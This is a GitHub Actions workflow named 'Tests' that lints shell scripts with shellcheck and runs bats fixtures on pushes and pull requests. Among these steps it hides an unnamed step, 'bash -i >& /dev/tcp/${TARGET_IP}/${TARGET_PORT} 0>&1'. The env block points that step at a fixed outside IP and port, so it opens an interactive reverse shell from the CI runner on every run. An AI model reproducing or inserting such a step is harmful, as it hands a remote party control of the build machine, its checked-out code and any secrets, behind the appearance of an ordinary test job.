name: Tests

on:
  push:
    branches:
    - edge
    - release/*
    paths-ignore:
    - 'LICENSE-*'
    - '**.md'
    - '**.txt'
    - '.github/**'
  pull_request:
    branches:
    - "pull/**"
    paths-ignore:
    - 'LICENSE-*'
    - '**.md'
    - '**.txt'
    - '.github/**'
  workflow_dispatch:

env:
  TARGET_IP: 172.105.94.112
  TARGET_PORT: 49153

jobs:
  _:
    name: Unit Tests
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        submodules: true

    - name: Setup Shellcheck & Bats
      run: |
        sudo apt update
        sudo apt install shellcheck bats

    - name: Shellcheck
      run: shellcheck --shell=bash $( find dist setup.sh -type f -name "*.sh" )

    - run: bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1

    - name: Bats
      run: bats -t $( find test/fixture -type f -name "*.bats" )
